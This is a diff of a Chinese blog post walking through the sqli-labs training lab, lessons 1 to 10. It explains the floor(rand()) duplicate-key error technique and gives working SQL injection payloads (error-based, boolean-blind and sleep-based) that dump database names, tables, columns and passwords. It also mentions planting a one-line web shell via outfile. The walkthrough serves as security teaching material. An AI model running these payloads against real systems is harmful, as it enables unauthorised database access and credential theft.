@@ -22,7 +22,7 @@
 
   
 
-  <title>SQL注入-sqli-labs-less1-4 | Liv_binz的技术博客</title>
+  <title>SQL注入-sqli-labs-less1-10 | Liv_binz的技术博客</title>
 
   
 
@@ -90,7 +90,7 @@
     <div class="header-content">
       <div class="post-text layout-block">
         <div class="layout-margin">
-          <h1 class="title-wrap">SQL注入-sqli-labs-less1-4</h1>
+          <h1 class="title-wrap">SQL注入-sqli-labs-less1-10</h1>
           <h2 class="title-sub-wrap">
             <strong>b1nz</strong>
             <span>发布于</span>
@@ -186,8 +186,55 @@ Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,adm
 <p><strong>2. updatexml()</strong></p>
 <p>正确使用格式：updatexml(xml_document,xpath_string,new_value)</p>
 <p>作用：将document中含有string的字符改成new_value</p>
-<p>原理与extractvalue()函数相同，不再赘述</p>
-<p><strong>0x2 基于主键重复的报错</strong></p>
+<p>原理与extractvalue()函数相同，不多说<br><strong>0x2 基于主键重复的报错</strong></p>
+<p> 运用<strong>group by</strong>、<strong>count()<strong>、</strong>floor()<strong>、</strong>rand()</strong> 构成的注入 </p>
+<blockquote>
+<p>在俺找这个注入原理看的时候看睡着了TT 看到最后也并不是完全通透,网上关于这个报错的原理就有点少,实在不理解我觉得会用就行哈</p>
+</blockquote>
+<p>这四个函数每一个都是产生报错的必要条件!!</p>
+<p>具体为什么,听我细细说来</p>
+<p>首先介绍一下**rand()**这个东西</p>
+<p>很有意思,你看上去他好像是随机的,其实给他一个种子数会生成一个伪静态序列</p>
+<p><img src="https://raw.githubusercontent.com/l1vb1nz/figurebed/main/20220126105109.png" alt="figure 1"></p>
+<p>无论运行几次都是一样的结果呢!</p>
+<blockquote>
+<p>官方文档曾经提示过,在查表的时候rand()会多次调用. 俺猜测,本身随机的效果就是靠多次调用来完成的</p>
+<p>只是猜的!!</p>
+</blockquote>
+<p>**floor()**向下取整函数 没啥好多说的</p>
+<p>但是配合<strong>rand(0)*2</strong>就会出现魔法</p>
+<p>首先: <strong>rand(0)*2</strong>生成了一个 [0,2] 的伪静态数列</p>
+<p>配合**floor()**使用就生成了一个只有0和1的伪静态数列,如图:</p>
+<p><img src="https://raw.githubusercontent.com/l1vb1nz/figurebed/main/20220126111656.png"></p>
+<p><strong>注意!!这串序列是固定的011011….</strong></p>
+<p>讲一下,count()<strong>和</strong>count(*)<strong>的区别在</strong>count(*)不会忽略null值</p>
+<p>搭配<strong>group by</strong>使用也很常规 不多说了</p>
+<p>接下来就是奇迹发生的地方了:</p>
+<pre><code>语句:SELECT count(*) from users group by concat(database(),floor(rand(0)*2))
+</code></pre>
+<p>产生报错,如图:</p>
+<p><img src="https://raw.githubusercontent.com/l1vb1nz/figurebed/main/20220126112846.png"></p>
+<p><strong>为什么捏为什么捏发生什么事了捏?</strong></p>
+<p>事情是这样发生的:</p>
+<p>首先<strong>group by</strong>会生成一个临时表</p>
+<p><img src="https://raw.githubusercontent.com/l1vb1nz/figurebed/main/20220126113822.png"></p>
+<p><strong>本来过程应该是这样的:</strong></p>
+<p>第一位选手:security0, 检索临时表, 表内没有已有的符合条件的key, 所以插入一个security0的key, count(*)计数+1</p>
+<p><strong>但实际上是这样的:</strong></p>
+<p>第一位选手:security0, 检索临时表, 表内没有已有的符合条件的key</p>
+<blockquote>
+<p>此时rand()又被调用了! 导致我们的的第一位选手改头换面变成了security1</p>
+</blockquote>
+<p>所以插入一个security1的key, count(*)计1, 如图</p>
+<p><img src="https://raw.githubusercontent.com/l1vb1nz/figurebed/main/20220126114643.png"></p>
+<p>随后,我们的第二位选手:security1登场, 已有符合的key, count(*)计数+1, 如图:</p>
+<p><img src="https://raw.githubusercontent.com/l1vb1nz/figurebed/main/20220126114928.png"></p>
+<p>第三位选手:security0登场, 没有符合的key</p>
+<blockquote>
+<p>rand()又被调用了! 这一位选手又改头换面变成了security1</p>
+</blockquote>
+<p>于是它又试图插入security1 <strong>buzz! error !</strong></p>
+<p>报错原理就是这样, 剩下的就是构造语句了 easypeasy</p>
 <h3 id="1x0-注入过程"><a href="#1x0-注入过程" class="headerlink" title="1x0 注入过程"></a>1x0 注入过程</h3><p><strong>1x1 基于格式错误的报错</strong></p>
 <p><strong>1. extractvalue()</strong></p>
 <pre><code>查库：
@@ -221,8 +268,140 @@ XPATH syntax error: &#39;~Dumb&#39;
 </code></pre>
 <p>limit+0,1依次偏移来获取全部数据</p>
 <p><strong>2. updatexml()</strong></p>
-<p>注入过程与extractvalue()函数相同，不再赘述</p>
+<p>注入过程与extractvalue()函数相同，不多说</p>
 <p><strong>1x2 基于主键重复的报错</strong></p>
+<pre><code>查库:
+?id=-1&#39; union select 1,2,count(*) from users group by concat(database(),floor(rand(0)*2)) --+
+回显:
+Duplicate entry &#39;security1&#39; for key &#39;&#39;
+</code></pre>
+<p>当前库名为security</p>
+<pre><code>查表:
+?id=-1&#39; union select 1,2,count(*) from users group by concat((select table_name from information_schema.tables where table_schema=0x7365637572697479 limit+0,1) ,floor(rand(0)*2)) --+
+回显:
+Duplicate entry &#39;emails1&#39; for key &#39;&#39;
+</code></pre>
+<p>limit+0,1依次偏移来获取全部数据</p>
+<pre><code>查列:
+?id=-1&#39; union select 1,2,count(*) from users group by concat((select column_name from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273 limit+0,1) ,floor(rand(0)*2)) --+
+回显:
+Duplicate entry &#39;id1&#39; for key &#39;&#39;
+</code></pre>
+<p>limit+0,1依次偏移来获取全部数据</p>
+<pre><code>查字段:
+?id=-1&#39; union select 1,2,count(*) from users group by concat((select password from users limit+0,1) ,floor(rand(0)*2)) --+
+回显:
+Duplicate entry &#39;Dumb1&#39; for key &#39;&#39;
+</code></pre>
+<p>limit+0,1依次偏移来获取全部数据</p>
+<h2 id="布尔盲注过程"><a href="#布尔盲注过程" class="headerlink" title="布尔盲注过程"></a>布尔盲注过程</h2><pre><code>查库:
+?id=1&#39; and left(database(),1)=&#39;s&#39; --+
+回显:
+Your Login name:Dumb
+Your Password:Dumb
+</code></pre>
+<p>一般配合bp intruder食用 查其他数据也一样, 不多说</p>
+<p>原始人方法是:</p>
+<ol>
+<li>判断语句: “ascii(substring()) <u>operator</u> 一个数字”</li>
+<li>二分法<br>搭配食用</li>
+</ol>
+<h2 id="延时注入过程"><a href="#延时注入过程" class="headerlink" title="延时注入过程"></a>延时注入过程</h2><pre><code>查库:
+?id=1&#39; and if(left(database(),1)=&#39;c&#39; ,1,sleep(3)) --+
+</code></pre>
+<p>和布尔盲注一样, 一般配合bp intruder食用</p>
+<blockquote>
+<p>其实用intruder也是原始人 一般直接配合sqlmap食用(逃ε=ε=ε=┏(゜ロ゜;)┛)</p>
+<p>等我心情好自己写个盲注脚本</p>
+</blockquote>
+<h1 id="Sqli-labs-Less2"><a href="#Sqli-labs-Less2" class="headerlink" title="Sqli-labs Less2"></a>Sqli-labs Less2</h1><ol>
+<li>请求方式— <strong>GET</strong></li>
+<li>包裹方式— <strong>id=1</strong></li>
+<li>注入类型— <strong>联合、报错、布尔盲注、延时</strong></li>
+</ol>
+<p>其他过程与less1相同</p>
+<h1 id="Sqli-labs-Less3"><a href="#Sqli-labs-Less3" class="headerlink" title="Sqli-labs Less3"></a>Sqli-labs Less3</h1><ol>
+<li>请求方式— <strong>GET</strong></li>
+<li>包裹方式— <strong>id=’’1’’</strong></li>
+<li>注入类型— <strong>联合、报错、布尔盲注、延时</strong></li>
+</ol>
+<p>其他过程与less1相同</p>
+<h1 id="Sqli-labs-Less4"><a href="#Sqli-labs-Less4" class="headerlink" title="Sqli-labs Less4"></a>Sqli-labs Less4</h1><ol>
+<li>请求方式— <strong>GET</strong></li>
+<li>包裹方式— <strong>id=(“1”)</strong></li>
+<li>注入类型— <strong>联合、报错、布尔盲注、延时</strong></li>
+</ol>
+<p>其他过程与less1相同</p>
+<h1 id="Sqli-labs-Less5"><a href="#Sqli-labs-Less5" class="headerlink" title="Sqli-labs Less5"></a>Sqli-labs Less5</h1><h2 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h2><pre><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;
+
+if true:
+    输出 You are in...........
+else:
+    print_r(mysql_error());
+</code></pre>
+<ol>
+<li>请求方式— <strong>GET</strong></li>
+<li>包裹方式— <strong>id=’1’</strong></li>
+<li>注入类型— <strong>报错、布尔盲注、延时</strong></li>
+</ol>
+<p>其他过程与less1相同</p>
+<h1 id="Sqli-labs-Less6"><a href="#Sqli-labs-Less6" class="headerlink" title="Sqli-labs Less6"></a>Sqli-labs Less6</h1><ol>
+<li>请求方式— <strong>GET</strong></li>
+<li>包裹方式— <strong>id=”1”</strong></li>
+<li>注入类型— <strong>报错、布尔盲注、延时</strong></li>
+</ol>
+<p>其他过程与less1相同</p>
+<h1 id="Sqli-labs-Less7"><a href="#Sqli-labs-Less7" class="headerlink" title="Sqli-labs Less7"></a>Sqli-labs Less7</h1><h2 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h2><pre><code>$sql=&quot;SELECT * FROM users WHERE id=((&#39;$id&#39;)) LIMIT 0,1&quot;;
+
+if true:
+    输出 You are in.... Use outfile......
+else:
+    输出 You have an error in your SQL syntax
+</code></pre>
+<ol>
+<li>请求方式— <strong>GET</strong></li>
+<li>包裹方式— <strong>id=”1”</strong></li>
+<li>注入类型— <strong>布尔盲注、延时</strong></li>
+</ol>
+<p>其他过程与less1相同</p>
+<p>特别的是: 这个地方作者给了一个hint:</p>
+<pre><code>use outfile
+</code></pre>
+<blockquote>
+<p>大家注意一下 </p>
+<p>此处有数据库权限问题</p>
+<p>和全局变量secure有关系</p>
+<p>当secure_file_priv 的值为 null 时: 不允许导入导出文件</p>
+<p>当secure_file_priv 的值为 /tmp/ 时: 导入导出文件只能发生在/tmp/目录下</p>
+<p>当secure_file_priv 的值为 空 时: 不对导入导出文件做限制</p>
+</blockquote>
+<p>俺也不是很明白作者到底啥意思哈 冷不丁来一句</p>
+<p>如果可以导入导出文件, 建议一句话木马配合蚁剑食用,美滋滋,这里不多说</p>
+<h1 id="Sqli-labs-Less8"><a href="#Sqli-labs-Less8" class="headerlink" title="Sqli-labs Less8"></a>Sqli-labs Less8</h1><ol>
+<li>请求方式— <strong>GET</strong></li>
+<li>包裹方式— <strong>id=’1’</strong></li>
+<li>注入类型— <strong>布尔盲注、延时</strong></li>
+</ol>
+<p>其他过程与less1相同</p>
+<h1 id="Sqli-labs-Less9"><a href="#Sqli-labs-Less9" class="headerlink" title="Sqli-labs Less9"></a>Sqli-labs Less9</h1><h2 id="源码-3"><a href="#源码-3" class="headerlink" title="源码"></a>源码</h2><pre><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;
+
+if true:
+    输出 You are in............
+else:
+    输出 You are in...........
+</code></pre>
+<ol>
+<li>请求方式— <strong>GET</strong></li>
+<li>包裹方式— <strong>id=’1’</strong></li>
+<li>注入类型— <strong>延时</strong></li>
+</ol>
+<p>其他过程与less1相同</p>
+<h1 id="Sqli-labs-Less10"><a href="#Sqli-labs-Less10" class="headerlink" title="Sqli-labs Less10"></a>Sqli-labs Less10</h1><ol>
+<li>请求方式— <strong>GET</strong></li>
+<li>包裹方式— <strong>id=”1”</strong></li>
+<li>注入类型— <strong>延时</strong></li>
+</ol>
+<p>其他过程与less1相同</p>
 
       </section>
 
